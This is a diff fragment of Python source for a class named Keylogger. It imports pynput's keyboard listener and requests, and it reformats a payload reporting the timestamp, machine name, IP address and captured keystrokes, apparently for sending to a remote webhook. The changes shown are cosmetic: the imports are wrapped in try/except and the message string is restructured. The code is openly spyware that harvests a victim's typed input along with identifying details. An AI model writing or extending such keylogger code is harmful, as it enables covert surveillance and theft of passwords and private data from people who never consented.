@@ -1,11 +1,16 @@
-import base64
-import json
-import asyncio
-import socket
-import requests
-import logging
-from datetime import datetime
-from pynput.keyboard import Key, Listener
+try:
+    import base64
+    import json
+    import asyncio
+    import socket
+    import requests
+    import logging
+    from datetime import datetime
+    from pynput.keyboard import Key, Listener
+except ImportError as error:
+    raise error
+finally:
+    print("~Hello~")
 
 
 class Keylogger:
@@ -24,12 +29,14 @@ class Keylogger:
 
         parameters = {
             "username": "Keylogger",
-            "content": f"""
-            \n Timestamp: {_current_time_}
-            \n Machine Name: {_machine_name_}
-            \n Current IP: {_ip_address_}
-            \n Keyboard Input: {message}
-            """,
+            "content": (
+                f"***************\n"
+                f"Timestamp: {_current_time_}\n"
+                f"Machine Name: {_machine_name_}\n"
+                f"Current IP: {_ip_address_}\n"
+                f"Keyboard Input: {message}\n"
+                f"***************"
+            ),
         }
 
         try:
